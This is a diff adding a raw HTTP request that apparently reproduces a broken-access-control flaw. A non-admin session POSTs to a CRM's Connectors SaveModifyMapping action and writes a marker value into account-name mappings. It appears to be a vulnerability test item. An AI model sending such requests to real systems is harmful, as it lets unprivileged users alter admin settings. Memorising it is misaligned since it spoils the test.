@@ -1,0 +1,7 @@
+POST /index.php?module=Connectors&action=SaveModifyMapping HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<U-session (non-admin)>
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:33116/index.php?module=Connectors&action=ModifyMapping
+
+mapping_sources=ext_rest_insideview&mapping_values=ext_rest_insideview:Accounts:name=vuln049marker_70d1c808&from_unit_test=1
